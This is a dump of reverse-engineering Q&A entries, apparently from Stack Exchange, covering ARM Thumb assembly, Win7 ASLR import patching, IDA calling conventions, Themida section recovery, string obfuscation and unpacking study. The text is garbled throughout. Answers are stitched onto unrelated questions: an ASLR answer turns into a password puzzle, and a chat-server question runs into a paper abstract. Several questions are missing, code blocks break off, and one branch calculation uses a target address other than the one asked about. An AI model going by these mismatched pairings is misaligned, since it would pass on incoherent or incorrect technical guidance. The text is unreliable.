"How do i make gnu as recognize all ARMV7 instructions?","652","","<p>I disassembled an android library with IDA, and want to do some extra steps at the end of one of the functions. Currently, the last instruction bytes are <code>BD E8 F0 8F</code>, in thumb mode, which IDA disassembles to <code>POP.W {R4-R11,PC}</code>.</p>

<p>So i found a nice little piece of unused space, replaced the <code>POP.W</code> with a branch there, wrote my extension, remembered to put a <code>.thumb</code> and <code>.arch armv7a</code> at the start of my program, and finished my code with that <code>POP.W {R4-R11,PC}</code>. Unfortunately, using gnu as from an arm toolchain, this results in <code>Error: bad instruction pop.w '{R4-R11,PC}'</code> </p>

<p>Ok, gnu as doesn't like the .w suffix, so i replaced the instruction with <code>POP {R4-R11,PC}</code>. This changes the error message to Error: invalid register list to push/pop instruction -- <code>pop {R4-R11,PC}</code></p>

<p>I know that some older ARM chips had restrictions on what you could do with registers from R8 on, so, just for verification, i replaced the instruction with <code>POP {R4-R7,PC}</code>. And indeed, as assembles this well.</p>

<p>Now I don't know how to continue?</p>

<ul>
<li>Maybe I have to give another architecture option to as. But .arch armv7a seems to be the newest which is valid with android armv7a libraries.</li>
<li>Maybe i'm completely off track, and the pop instruction is actually a macro for two separate instructions, which pop high and low registers after another. But, the result of entering the individual two-byte instructions (<code>BD E8</code>, <code>F0 8F</code>) into the online disassembler seems to have nothing to do with popping from the stack.</li>
</ul>

<p>I also tried disabling macros in IDA's processor options, which didn't change anything. So i'm inclined to think the byte sequence is a genuine 4 byte thumb mode opcode.</p>

<p>What else do i need to specify in my program to make gnu as recognize the instruction?</p>
","<p>By default, <code>as</code>, uses the old 'divided' syntax for arm and thumb instructions. Hence it is not recognising your <code>pop.w</code> instruction.</p>

<p>To make it work, add <code>.syntax unified</code> at the start of your program.  This tells it to use the new unified syntax and you should find it assembles <code>pop.w</code> successfully.</p>

<p>See <a href=""https://sourceware.org/binutils/docs-2.24/as/ARM_002dInstruction_002dSet.html"">https://sourceware.org/binutils/docs-2.24/as/ARM_002dInstruction_002dSet.html</a> for more details.</p>

"Win7 ASLR bypass","649","","<p>The conditions: say one patched programm has hardcoded address of <code>printf()</code> from dynamically loaded <code>msvcrt80.dll</code>. It works just fine on XP, but Win7 randomizes address space (ASLR), so this trick become impossible and program crashes with call of my hardcoded <code>printf()</code> address.</p>

<p>What should I do to retrieve IAT RVA of this <code>printf()</code> in win7 to make this work?</p>
","<p>If you can patch the program's image, you don't actually need to hardcode the address. you can simply add another import entry to the already existing import tables and have it patched in automatically by the loader.</p>

<p>If the compare succeeds, then the password is correct</p>

<p>I was thinking that it would have been <code>FBQ2GE9</code>, but that's apparently the wrong answer. What am I missing here?</p>
","<p>I'm not specialist, especially in C++ re, but password is constructing in the lines:</p>

<p>Second command is <code>null</code>-byte in null terminated strings.

So answer is in that numbers: <code>70617274 32 54686532 6E645061 7274</code>.
This is hex representation of password, which you can convert into ascii with python3 command:</p>

<p>Where <code>EnumFirstValidChild</code> is defined as:</p>

<pre><code>int __userpurge EnumFirstValidChild&amp;lt;eax&gt;(int a1&amp;lt;eax&gt;, int a2, int a3);

<p>I modified the code above to call the userpurge function as follows:</p>

__asm 
{ 
  push v12
  push a1
  call sub_10029800

<p>The problem I am having is that the call to this function is causing a stack a Run-Time Check Failure #2 - Stack around <code>v11</code> variable.</p>

<p><code>v11</code> is 4 bytes long and I see that more than 16 bytes are wtitten to that pointer.</p>

","<p>Let's start from the begginning :</p>

<pre><code>int __userpurge EnumFirstValidChild&lt;eax&gt;(int a1&lt;eax&gt;, int a2, int a3);
</code></pre>

<p>Your <code>EnumFirstValidChild</code> prototype takes <code>eax</code> as the first argument, but if you look at <code>eax</code> in this function, it gets immediately erased by <code>Teb-&gt;NtTib-&gt;ExceptionList</code> (aka <code>fs:[0]</code>) at <code>.text:1000B718</code>.</p>

<p>Thus, the first argument isn't valid, let's fix that as a first step :</p>

<pre><code>int __cdecl EnumFirstValidChild (int a1, int a2);
</code></pre>

<p>I think you have already found that out, but better make sure everything is clear.</p>

<p>Now, more precisely about your question :</p>

<blockquote>
  <p>v11 is 4 bytes long and I see that more than 16 bytes are written to that pointer.
  What could it be wrong? </p>
</blockquote>

<p>As you may know, Hexrays doesn't produce compilable C code, but pseudo C-like code. 
You have to give hints to the decompiler if you want it to decompile a correct C code.</p>

<p>About your issue, you were right, v11 is not 4 bytes long, but actually at least 32 bytes long : at the end of the function <code>EnumFirstValidChild</code>, it writes 32 bytes at the adress of the second argument :</p>

<pre><code>*(_DWORD *)a3 = 0;
*(_DWORD *)(a3 + 4) = 0;
*(_DWORD *)(a3 + 8) = 0;
*(_DWORD *)(a3 + 12) = 0;
*(_DWORD *)(a3 + 16) = 0;
*(_DWORD )(a3 + 20) = 0;
*(_DWORD *)(a3 + 24) = 0;
*(_DWORD *)(a3 + 28) = 0; 
</code></pre>

<p>Furthermore, the decompiler gives you a quick way to notice this :
In <code>sub_10029900</code>, there's nothing on the stack except :</p>

<pre><code>int v11; // [bp-20h]
</code></pre>

<p>As you can see, there's some space between bp and bp-20h. There is just enough space for your 32 bytes array, so we can conclude that your structure size is indeed 32 bytes long.</p>

<p>If you wish, you can fix the output of Hexray following this procedure :</p>

"Relocation table patching","647","","<p>Now working on binary analysis of PE and stuck on tricky (for me), ungoogleable question.</p>

<p>For instance, I've binary, that needs to be patched. So after doing that will be awesome, if there is way to insert address of my function to relocation table. The following picture can illustrate thing I'm talking about.</p>

<p><img src=""https://i.stack.imgur.com/bk5RQ.png"" alt=""Relocated functions in binary""></p>

<p>So, as you can see, relocated functions marked pale, and my function is not in the relocation table. What should I patch to add my function into relocation table? Tried CFF Explorer with no luck. All the patches was made in hiew.</p>
","<p>Issue solved. For that moment tested several utilities for relocation patching. </p>

<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/RelocEditor"" rel=""nofollow"">RelocEditor</a> - didn't solve the issue, but maybe for some future researchers who will face with similar task will find it useful </p>

<p><a href=""https://yadi.sk/d/58FFCzwdVkTuo"" rel=""nofollow"">Reloc Rebuilder</a> - actually solved issue. Just select patched executable and app should fix the relocation table.</p>

"Good foundation for reverse engineering malware","646","","<p>I have been intrigued by reverse engineering recently and just finished Paul Carter's <em>PC Assembly Language</em> book (<a href=""http://pacman128.github.io/static/pcasm-book.pdf"" rel=""nofollow"">http://pacman128.github.io/static/pcasm-book.pdf</a>) which was a great primer for x86. My first question is: What is a good intermediate level book to get a better grasp of x86 assembly? Secondly: Should I get a better grasp of the C programming language before I dive deeper into x86? At the moment I only have basic knowledge of C as well.</p>

<p>Sorry if this is an opinion type question but I highly respect the input of people on this forum regarding this topic.</p>
","<p>Knowing how things in C work under the hood will help you if you're familiar with C and use it as your primary programming language, otherwise it's perfectly fine to have x86 asm as your first programing language.</p>

<p>If you want a better understanding of the relationship between C and x86 assembly, I recommend reading the 7th chapter of <a href=""http://rads.stackoverflow.com/amzn/click/1931769222"" rel=""nofollow noreferrer"">Hacker disassembling uncovered</a> (there's a free chm version online).</p>

<p>As a reverse engineer you'll need to understand and be fluent with machine code. Knowing C might help because it's relatively low level and forces you to understand machine level concepts such as the stack, pointers, etc. Good grasp of assembly is far more important.</p>

"Read a struct from memory","646","","<p>I'm trying to load a struct defined in a program that i'm reading the memory of, so I can use it to define objects in my python debugger (in windows).</p>

<p>What format do structs take in memory, and what information can i get from finding the struct.
Is it possible to find the offsets for all attributes, and all objects linking to the struct?</p>

<p>I'd prefer to be able to do this without using breakpoints, but I can use them if there is no other way.</p>
","<p>You should rather ask your questions with some kind of example output so that answers are not based on guesswork. </p>

<p>Does <em>iam loading the struct</em> mean </p>

<ul>
<li>I wrote a program where I am employing OpenProcess() ReadProcessMemory() </li>
</ul>

<p>or does it mean</p>

<ul>
<li>i am opening the raw file with FILE * fp ; fopen(""c:\XXX"",""wb"") fread(fp); or load it in say ollydbg or in a hexeditor</li>
</ul>

<p>Assuming you use <code>ReadProcessMemory</code> 
the buffer you provided will be filled with bytes. It is up to you to cast it to proper type for accessing various members of the struct 
(yes you need a valid prototype of the structure beforehand).</p>

<p>A pseudo form could be like this</p>

<pre><code>type result;
BYTE foo[0x100];
Mystruct *blah;
int s1;
PSTR s2;
result = ReadProcessMemory(where,howmuch,destination,VerifiactionPointer)
blah = (MyStruct *)destination;
s1 = blah-&gt;someint;
s2 = blah-&gt;somestring;
</code></pre>

<p>Memory you see will always contain hex bytes that are indistinguishable from one another. It is like clay in the hands of a potter. </p>

"ARM: understanding MSR/MRS instructions","645","","<p>While reversing a bootloader, i have a lot of msr/mrs instructions, but i cannot find in the arm documentation the meaning of the parameters.</p>

<p>Could someone explain how to parse these instructions and point me to the right documentation ?</p>

<p>Maybe there is a script or plugin to automate the process ?</p>
","<p>The presence of X0 and the use of MSR to access a system register tells me that you are on 64-bit ARM / ARMv8.</p>

<p>Section C6 describes the instructions.  You can find <code>MSR (register)</code> at C6.2.131 and <code>MSR (immediate)</code> at C6.2.130. These both access system control registers.</p>

<p>Section D7 describes the generic ARMv8 system control registers. In D7.2.34 you can find the information that your <code>MSR</code> instruction is accessing the <code>HPFAR_EL2</code> register which contains the ""Hypervisor IPA Fault Address.""  (see the table at the bottom of the section that shows the values of op0/op1/CRn/Cm/op2 that correspond to this register.)</p>

"How to debug an IDA Pro plugin built with the C++ IDASDK","645","","<p>I'm building an IDA Pro plugin (not a script) using the C++ SDK. On top of the frustration added by the lack of a proper API documentation, I cannot find a good way to debug my plugin.</p>

","<p>Most modern IDE's allow you to specify an executable to launch when debugging, you should specify your ida executable. Or otherwise, try to attach to the running IDA process.</p>

<p>When you put a breakpoint in the run() function of your plugin, your IDE will stop at run,  and you can singlestep, etc from there.</p>

"XMPP clubs in league of legends","645","","<p>Hopefully I'm asking this at the right place. League of legends recently added the option to join a club.

<p>For public chat rooms, you connect through the ""lvl.pvp.net"" server.</p>

<p>For the private clubs' chat rooms, the server is now ""pgc.pvp.net"".</p>

<p>My problem is that I can't figure out how to find the room address to connect to a club. The clubs are private rooms. Only someone that is part of the club can view and chat in the club. Unlike for a public chat room, where the address is simply: <strong><em>pu~""Channel name hashed and no capital letters""</em></strong>, a club address is a UUID and therefore, unlike public rooms, it's impossible to figure out the room address from the club name. </p>

<p>Riot is fine with people connecting to the XMPP server from outside apps, but they haven't provided an easy way to find the UUID for a club room.</p>

<p>How do I find what it is for my club?</p>

<p>To quote the papers abstract:</p>

<blockquote>
  <p>The output of a disassembler is used for many different purposes
  (e.g., debugging and reverse engineering). Therefore, disassemblers
  represent the ﬁrst link of a long chain of stages on which any
  high-level analysis of machine code depends upon. In this paper we
  demonstrate that many disassemblers fail to decode certain
  instructions and thus that the ﬁrst link of the chain is very weak. We
  present a methodology, called N-version disassembly, to verify the
  correctness of disassemblers, based on differential analysis</p>

"Decompile binary executable into c / asm code by emulation, is it possible?","641","","<p>I am thinking on a decompilation method which uses the runtime behavior of the binary executable to extract usable compilation data.

<ul>
<li>we could differentiate between the static constant data (""<code>.text</code>"") and the binary asm</li>

<p>Is it possible? Does any tool / software already exist which is capable to do this?</p>
","<p>This problem is linked to the halting problem on a Turing machine (which is known to be undecidable). </p>

<p>Yet, this is a theoretical problem that you unlikely find in real life (except if it has been planted here intentionally to prevent the full exploration through emulation).</p>

<p>But, in a more practical perspective, exploring all paths can be done only if you can easily run through all the path at runtime, which is not the case when the user is required to solve a challenge (possibly on-line) such as giving a password whose hash is stored in the program or prove that he posses a private key by signing a message and returning it to the software.</p>

<p>The IAT is the Import Address Table. It's an an array of pointers to statically-imported API function addresses. The IAT entries gets populated at runtime.</p>

<p>The format of the IAT is typically as follows, with all functions from a particular DLL grouped together, with a null-pointer separating each DLL's list of function addresses:</p>

<p><code>&lt;pointer to DLL #1's function A&gt;, &lt;pointer to DLL #1's function B&gt;, &lt;pointer to DLL #1's function C&gt;, 0x00000000, &lt;pointer to DLL #2's function D&gt;, &lt;pointer to DLL #2's function E&gt;, ..., 0x00000000</code></p>

<p>Note that this format isn't required, but it's the most common format.</p>

<blockquote>
  <p>Now I don't udnerstand how he know where the end of the IAT just from looking on the dump?</p>
</blockquote>

<p>I highlighted each IAT function below (with mspaint), with a different color for each DLL grouping. At virtual address <code>0x0049380C</code> we see the function addresses <code>0x735FE9D0</code>, <code>0x73654AC0</code>, etc. You can tell that they're likely from the same DLL because:</p>

<ol>
<li>There's no null-pointer separating them, and</li>
<li>They're all in the same address range (<code>0x735F0000</code> - <code>0x7366FFFF</code>)</li>

<p>The DWORD at <code>0x00493850</code> (after the null-pointer at <code>0x0049384C</code>) is <code>0x1000176E</code>, so you can look up that address in your debugger and see if there's DLL code loaded at that address. If not, <code>0x0049384C</code> would mark the end of the IAT. If so, <code>0x00493854</code> would mark the end of the IAT since the data at <code>0x00493858</code> is the beginning of an ASCII string and clearly not a valid function pointer.</p>

"Android bytecode verifier","628","","<p>One of the things that makes Java bytecode (.class) so easy to reverse engineer is that the JVM's verifier ensures that bytecode can always be disassembled via linear sweep. Instructions have to be consecutive starting at offset 0, and you can't jump into the middle of an instruction.</p>

<p>However <a href=""http://www.dexlabs.org/blog/bytecode-obfuscation"">this post</a> implies that Dalvik does not do such bytecode verification. The authors do all the usual x86 shenanigans like jumping into the middle of an instruction, which is apparently allowed. Is this true? Do Android VMs actually perform any kind of loadtime bytecode verification? If not, why?</p>
","<p>this is not entirely true. Dalvik bytecode will also be verified on the device, but this happens during installation time, not runtime. A verified and optimized version of the dex file will be stored on the system, protected by file system permission (you cannot change it afterwards unless you have rooted your device).</p>

<p>The trick that was used in the blog post is that you can set a specific flag within the class header which tells the verifier to skip this class.</p>

<p>How can I find out what protocol (I2C, SPI, RS232, ...) is being used on the lines, if any standard?</p>
","<p>My guess is that the protocol is standard, using a non standard protocol between two devices involves using bitbanging which is not very useful.
Let's assume then that the protocol is standard.
It's not SPI, SPI needs 4 lines To work. I2C needs two, RS232 needs only two.
I don't know what the third line job is, maybe it's used for trigerring/synchronization between the chips.</p>

<p>What now ? I would open the data sheet of the microcontroller and see what protocols the chips supports, usually if they are new 32bit SOC, they all support CAN, SPI, USART, etc.
Then I would check the pinout of the corresponding lines, to see to which ports they are connected on the chip. This will point you to the exact protocol used.</p>

"Offset Calculation for a Branch Instruction Thumb","627","","<p>I did find this link: <a href=""https://reverseengineering.stackexchange.com/questions/9094/offset-calculation-for-branch-instruction-in-arm?newreg=644a4b2d707a476496570137fcb31e37"">Offset calculation for branch instruction in ARM</a></p>

<p>Which was quite helpful but also confusing for me. I tried few ways to get it working with my offsets but failed.</p>

<p>What I wanted to do, was create a BL instruction from 0x52F4D6 to 0x5BF368.</p>

<p>At 0x52F4D6 I wanted to write BL sub_5BF368 but how do I get the correct hex code (thumb) for it?</p>

<p>Thank you!</p>
","<p>You can get this from the ARM manual; for example from the version linked at the link you found, <a href=""https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf"" rel=""nofollow"">https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf</a>.</p>

<p>First, a quick calculation <code>5BF358-52F4D6</code> yields <code>8FE82</code>, so you see you have more than 12 bits, and need to use the long branch format in 5.19, which splits your <code>BL</code> into two instructions. The section says ""The branch offset must take account of the prefetch operation, which causes the PC to be 1 word (4 bytes) ahead of the current instruction"", so the offset you need is from 4 bytes behind <code>52F4D6</code> - <code>52F4DA</code>, which means the offset for the instructions - the value you want to add to <code>PC</code> is <code>8FE7E</code>.</p>

<p>The first part of the instruction shifts its partial offset left by 12 bits, and adds this to PC. The instruction format is <code>1111HXXXXXXXXXXX</code> in binary, with <code>H=0</code>, so <code>F000+XXXX</code> in hex. What you want to add to PC in this step is <code>8F000</code>, so the opcode for this instruction is <code>F0 8F</code>.</p>

<p>The second part shifts its partial offset left by one bit (remember thumb instructions are aligned to 16 bit, so the last bit of an offset is always 0, so it doesn't have to be represented in the hex opcode), and it has <code>H=1</code>, so the opcode is <code>F800+XXXX</code>. What you want to add in this step is <code>E7E</code>. Shift that right by one bit to get <code>73f</code>, and add to your opcode to get <code>FF 3F</code>.</p>

<p>So, your BL instruction is <code>F08F FF3F</code>.</p>

<p>To confirm this, create an assembly program, assemble it, and check the result:</p>

<pre><code>.thumb
.arch armv7a
.syntax unified
.align 2
.org    0x52F4D6

            dd 0x06040606, 0x06060606, 0x06060606, 0x06060606

            dd 0x06060606
</code></pre>

<p>No index in the <code>indirect_table</code> will end up referencing any of the 6 pointers in <code>table1</code>. Index 6 will dereference a null pointer, index 7 will dereference <code>0x01060600</code> and indexes <code>0x8B</code> and <code>0xFF</code> will end up dereferencing garbage. So everything will end up access violating.</p>

<p>So perhaps this is a compiler optimization, the data at table1 following the 6 code pointers and 1 null pointer looks like an indirect table, and coincidentally all indexes are suitable for this switch statement (0-6). While the binary has no references to this data, if <code>EBX</code> was known to be <code>0x29</code> or upwards, it would reference into this. The compiler may have decided <code>EBX</code> will not be <code>0</code>-<code>0x29</code> so moved the indirect table location backwards to line things up correctly. What then is the role of <code>cmp edx, 0x3B</code> in this?</p>

<p><strong>Is this a compiler code gen issue, a compiler optimization, or have I grossly misunderstood the code?</strong> </p>

<p>If an optimization, any supporting reading material would be greatly appreciated.</p>
","<p>Either there is a check somewhere before, or the compiler knows otherwise that <code>edx</code> is not less than 41 (0x29). 0x3B is probably handled by a single switch label, so the compiler added this check to avoid the double memory lookup (or maybe there's an actual <code>if</code> before <code>switch</code> in the source).</p>

<p>The table at 0x1009E7D4 is used to retrieve the jump table entry index - Visual C++ compiler always puts the indirect table after the jumps. 0x1009E7AB is likely a part of the previous switch's indirect table. And <code>8B FF</code> is <code>mov edi, edi</code>, used here for alignment.</p>

<p>This specific optimization (no subtraction for zero-indexing) seems to be pretty rare; I think I've only seen it in Windows DLLs which often use PGO and other tricks to achieve the last few percents of performance.</p>

<p>Alternatively, I suppose one could just dump the debug symbol offsets to a text file and read that, but it seems like a clunkier solution (since you wouldn't be able to, e.g., auto-download symbols from the MS Symbol Server).</p>
","<p>At the moment, there is no way to debug a dylib. I know that it is a real problem, and I plan to add such a feature in a future update.</p>

<p>Another thing that will be added to Hopper is the ability to load multiple file in the same document, in order to disassemble things like kext for instance.</p>

"Protect data stored in binary","624","","<p>Let's say I've some function(i.e. hash function), that generates value from input seed and some precomputed hash values, that are stored somewhere in binary. What are the possible approaches for:</p>

<ol>
<li>Protect string data against dumping</li>
<li>Protect hash algorithm from being reverse engineered for a while</li>
</ol>

<p>I understand that the goal of complete algorithm concealment from reverser is impossible but what technique will raise the efforts to do this?</p>

<p>My thoughts on this topic:</p>

<ol>
<li>Protect hash strings with <a href=""http://www.sevagas.com/?String-encryption-using-macro-and"" rel=""nofollow"">encryption macro</a></li>
<li>Obfuscating target function using some king of obfuscation/poly/metamorphic engine in order to prevent easy algorithm recovery(can lead to AV false positive but should not harm in general)</li>
<li>Roughly generate new  hash function and values for each copy of program(kind of hard to implement and maintain)</li>
</ol>

<p>Maybe anybody have better concepts that will suit my goal and be so kind to post it here.</p>

<p>P.S. please do not advice to use packers/protectors. False positive AV does not cost couple functions algorithm concealment.</p>

","<p>I would start with not have critical strings in memory in linear manner</p>

<ul>
<li>rather each character can be offseted by some offset</li>
<li>by table mixing all the strings together</li>
<li>For example you got <code>0123456789</code></li>
<li>if you store them in memory like this:</li>
<li><code>|0x1xx2xxx3xxxx4|</code></li>
<li><code>|xxxxx5xxxxxx6xx|</code></li>
<li><code>|xxxx7xxxxxxxx8x|</code></li>
<li><code>|xxxxxxxx9xxxxxx|</code> where x is anything or another string ...</li>
<li>it is pretty hard to get the meaning</li>
</ul>

<p>Next level is even better</p>

<pre><code>//---------------------------------------------------------------------------
const int N=16384;
char txt[N];    // my texts
int  ofs[N];    // randomized offsets
//---------------------------------------------------------------------------
void ofs_init()                 // randomize offsets
    {
    int i,j,a;
    for (i=0;i&lt;N;i++) ofs[i]=i;
    for (i=0;i&lt;N;i++) { j=Random(N); a=ofs[i]; ofs[i]=ofs[j]; ofs[j]=a; }
    }
//---------------------------------------------------------------------------
void ofs_write(int adr,char a) // linear to ofset encoding
    {
    txt[ofs[adr]]=a;
    }
//---------------------------------------------------------------------------
char ofs_read(int adr) // linear to ofset decoding
    {
    return txt[ofs[adr]];
    }
//---------------------------------------------------------------------------
</code></pre>

<ul>
<li>so create offset table on runtime</li>
<li>which will randomly map linear string offsets to nonlinear offsets</li>
<li>this is very hard to decode because it mixes all strings together (and if they are hashes) then without stepping is almost impossible to decode this (not knowing what it does of coarse)</li>
</ul>

<p>Here an example of how to use it and how output looks:</p>

<pre><code>// [encode] + save to file for output comparison
// AnsiString s holds oll my texts (an image in this case)
Randomize();
ofs_init();
for (i=0;i&lt;s.Length();i++) ofs_write(i,s[i+1]);
i=FileCreate(""picenc.txt""); FileWrite(i,txt,N); FileClose(i);
// [decode] you should not decode critical strings to memory rather decode each char only when needed instead
// I decode the whole thing to save to file for output comparison
for (i=0;i&lt;s.Length();i++) s[i+1]=ofs_read(i);
i=FileCreate(""picdec.txt""); FileWrite(i,s.c_str(),s.Length()); FileClose(i);
</code></pre>

<p>And the results are like this:</p>

<ul>
<li><img src=""https://i.stack.imgur.com/2dOxN.png"" alt=""output""></li>
<li>on the left is decoded text <code>picdec.txt</code></li>
<li>on right is encoded text <code>picenc.txt</code> this is how the srings looks in memory</li>
</ul>

<p>On top of this you can add any kind of encryption (not only to text itself but to offset table also ...)</p>

"Setting Breakpoints at functions decoded by Hopper/IDA Pro in an iOS app","624","","<p>So, its been very interesting to reverse engineer an iOS application and I have made significant improvement into learning how to read disassembly and understand them. Now I was trying to debug the iOS app using lldb debugserver.</p>

<p>I was able to attach my system to my jailbroken ipad running the gdb server and hooked it to one of the running process. Now the problem is, that the executable has no symbols (or at least lldb is telling me that). But when I tried to disassemble it in IDA Pro and Hopper, I was able to get all the objective-c classes and functions names. </p>

<p>For example, one of the function that is being used is HMACWithSecret which has the signature -[NSString(HMAC) HMACWithSecret:]</p>

<p>If I try to set a break point from lldb using the command</p>

<pre><code>b -[NSString(HMAC) HMACWithString:]
</code></pre>

<p>Or any other variant</p>

<pre><code>b HMACWithSecret:
b HMACWithSecret
</code></pre>

<p>It fails to find a location for the same. I know that in objective-c every call is made via objc_msgSend with arguments about which function to call. But if i want to set a breakpoint in the above function (or any other I reveal via Hopper/IDA Pro) what should I do? </p>
","<p>I was able to achieve this by installing gdbserver on my ipad. Then i ssh into the ipad and attach a remote lldb debugger (xcode tools) to attack breakpoints. A long method but works. There are now tools to debug in same way on android and ios. </p>

"Best and smarter way to improve unpacking skills","623","","<p>I want to find a way to improve my unpacking skills, i am not a noob but i miss steps from simple to hard packers.</p>

<p>I saw lot of video tutorials, the most of the time i see ""click F9 x times to reach the OEP"" or ""ESP trick"" without go deeper as i want. 
I find the learning process slow in this way.</p>

<p>I am searching for paper or books to go deeper in this art, my goal is to be able to face malware analisis in the best way.</p>

<p>Please advice, thanks</p>
","<p>There is not a single paper or book that explains the art of unpacking. This is mainly due to all the different packers that require different techniques to unpack them. There are of course generic approaches that work on some packers but knowing when to use them is gained from experience. IMHO the best approach to learn unpacking is to follow along with unpackmes in a debugger. My favorite unpacking author is <a href=""http://www.reversing.be/search.php?query=&amp;keyType=phrase&amp;datestart=&amp;dateend=&amp;topic=0&amp;type=all&amp;author=63&amp;mode=search"">Haggar</a>. Once you go through a handful of the tutorials you will observe patterns of instructions and API sequences. Once you see those patterns you should try to unpack the sample using what you previously learned. If you fail, you can continue on with the tutorial and if you succeed, you can move on to the next tutorial. Either way you learn something new or apply previously gained knowledge. In the long run it will help you with unpacking malware. </p>

"Recovering original PE sections after Themida merges them","623","","<p>Visual C++ produces binaries with <code>.code</code>, <code>.rdata</code>, and <code>.data</code> sections (in that order). Themida merges all three into a nameless section, which is detrimental to analysis. In particular, I want to run the <a href=""http://www.openrce.org/downloads/details/253/IDA_Extra_Pass"" rel=""nofollow"">Extra Pass</a> plugin for IDA on a dump from memory of a Themida'd executable (imports not recovered), but it needs the real bounds of the .code section or it will aggressively convert a lot of actual data into code.</p>

<p>How could I go about recovering the base of the <code>.rdata</code> and <code>.data</code> sections?</p>
","<p>Basically the best way to start doing this is to compile your own EXE (with the same compiler as the Themida protected file when possible) and try to merge the sections by yourself. I crafted an example for you (source code: <a href=""http://codepad.org/RqNiH3Ly"" rel=""nofollow"">http://codepad.org/RqNiH3Ly</a>, download RAR (merged + directly compiled): <a href=""https://mega.co.nz/#!aoAUALBJ!6riSM4VmT43Ywf_jxQAY73EsVXyjEAAhJ1rOSGaYdeI"" rel=""nofollow"">https://mega.co.nz/#!aoAUALBJ!6riSM4VmT43Ywf_jxQAY73EsVXyjEAAhJ1rOSGaYdeI</a>, just some executable I was working with at the moment, compiled with VS10).</p>

<p>The base of the .data section can basically be found by searching for references to every address aligned to 0x1000 in the code (VS10 uses data pointers in order, so just scroll up to the base of the first section and look for a pointer). For example:</p>

<blockquote>
  <p>01251000  /$  81EC 0C010000 SUB ESP,10C<br>
  01251006  |.  A1 00302501   MOV EAX,DWORD PTR DS:[1253000] ; pointer to .data<br>
  0125100B  |.  33C4          XOR EAX,ESP</p>
</blockquote>

<p>In my case (the EXE also has relocations) the ImageBase was 0x1250000, so the RVA of the .data section would be 0x1253000 - 0x1250000 = 0x3000</p>

<p>The .rdata section is just the RVA aligned up to 0x1000 from the actual end of the code (you can learn this from the original file). In this case:</p>

<blockquote>
  <p>012518E2   $- FF25 60202501 JMP DWORD PTR DS:[&lt;&amp;MSVCR100._except_han><br>
  012518E8   $- FF25 64202501 JMP DWORD PTR DS:[&lt;&amp;MSVCR100._invoke_wat><br>
  012518EE   $- FF25 68202501 JMP DWORD PTR DS:[&lt;&amp;MSVCR100.<em>controlfp</em>> ; end<br>
  012518F4      00            DB 00<br>
  012518F5      00            DB 00</p>
</blockquote>

<p>0x12518EE - 0x1250000 = 0x18EE, rounded up 0x2000, so the original RVA of the .rdata section is 0x2000.</p>

<p>Similar calculations can be done for the .reloc section (search for the binary mask ""3? 3? 3? 3? 3?"" will get you pretty close on x86).</p>

<p>Just learn to know the compiler structure and use it to recover something similar to the original (maybe Themida just appends the raw section data and changes all data pointers etc). Hope this helps a little :)</p>

"Adding Backlink for XREF in IDA","618","","<p>I have an indirect call to a function. I traced the program and added the target to the xref, so this works fine. The problem is though, that on the position where the call is, there is no link shown. I thought, that, when I add an XREF, both positions are shown, because this is also the behaviour with the other referenzes, IDA automatically finds out.</p>

<p>To illustrate what I mean:</p>

<p>The call is here without showing me where it points to:</p>

<pre><code>CODE:004A3F07 00C                 call    dword ptr [edx+28h]

<p>The xref I added is here showing the link:</p>

<pre><code>CODE:004A3390     DecryptMemory proc near            ; CODE XREF: sub_4A3EC0:loc_4A3F07 P
</code></pre>

<p>Is it possible to make IDA show the reference on both addresses? I know I can create a manual xref there as well, but then IDA creates a label as well, which makes it a bit confusing, when revisting. I tried to remove the label, but this doesn't work either (would this be possible?).</p>
","<p>IDA does not automatically show the xref existence at the source as you are claiming. In most cases it's not necessary, as the destination is usually printed as part of the instruction or data item.</p>

<p>However, for resolved indirect calls the <em>processor module</em> may display a comment to help the user. For some processors (including x86) you can use the ""Change callee address"" plugin (<kbd>Alt+F11</kbd>) to manually set the destination of an indirect call. It adds both an xref and makes the processor module print an auto-comment.</p>

","<p>Seems like <em><a href=""https://en.wikipedia.org/wiki/Relocation_(computing)"" rel=""nofollow noreferrer"">relocation</a></em>. If you look at the addresses in your first listing, you will notice that these addresses are unusually low. That's probably because gdb displays file offsets there (although I have no idea why that is the case for you).</p>

<p>When you run the file, the loader kicks in and maps the sections to the virtual address space of the program, and thats where the <code>0x0000555555554000</code> section offset comes from. </p>

<p>You can see the file offsets of each section using <code>maint info sections</code>. You can get information about the actual mapped memory sections using <code>info proc mappings</code> at runtime.</p>

<p><strong>edit:</strong></p>

<p>Based on the output of the commands above, everything seems to be alright.</p>

</code></pre>

<p>This line states that the <code>.text</code> section of your code starts at file offset 0x540 and ends at 0x702 containing code. If your compare it with your first disassembly starting at offset 0x64a, this is a decent fit.</p>

<pre><code>0x555555554000     0x555555555000     0x1000        0x0 /tmp/test
</code></pre>

<p>This line states that the executable itself was mapped to the base address <code>0x555555554000</code>. Given the offset from before, that means your main function should be at <code>0x555555554000 + 0x64a</code>. Your second disassembly confirms that.</p>

"Disassembling an MS-DOS EXE","617","","<p>I've been disassembling an MS-DOS EXE and I've been using this link <a href=""http://www.delorie.com/djgpp/doc/exe/"" rel=""nofollow noreferrer"">http://www.delorie.com/djgpp/doc/exe/</a> to make heads and tails of the binary.</p>

<p>The header seems to be an older version compared to the headers that precede the PE segment found in today's modern Windows executables.</p>

<p>I've been using nasm's (Disassembler), but the program is not as complex as IDA Pro. Finding it hard to find main function entry point, especially with the disassembler engine working on an offset based logic to determine the decoding per instruction and due to the nature I'm also not familiar with the standard.</p>

<p>I'm assuming the IP field in the MS-DOS could be the main function entry point of the executable and was hoping someone or somebody could confirm my speculations.</p>
","<p>The entry point is calculated like this:</p>

"How are vulnerabilities (especially buffer overruns) found in the wild?","615","","<p>I hope this question is not OT for RE, but I'm rather curious as to how vulnerabilities are usually found.</p>

<p>Of course I'm aware that companies are doing code audits to identify security problems but I doubt that the results of such audits are publicly made available. Another way to find potential attacks is of course thinking about the details of a particular technique and finding its weakness (a timing attack would probably qualify as such).</p>

<p>However, in the case of buffer overruns, I'm always wondering how people find out about it. I mean, if there is a release of some software, reversing it and hoping to find a buffer overflow this way seems rather hopeless to me, considering how much work this is. If your software crashes because of some special input, then of course this can be analyzed and might result in a security vulnerability. So are malware author just monitoring various sources (bug reporting site or similar) in the hope of hearing about such cases to look into it? Somehow I can't believe it.</p>
","<p>Most vulnerabilities in closed-source products are found via fuzzing and static reverse engineering.</p>

<blockquote>
  <p>reversing it and hoping to find a buffer overflow this way seems
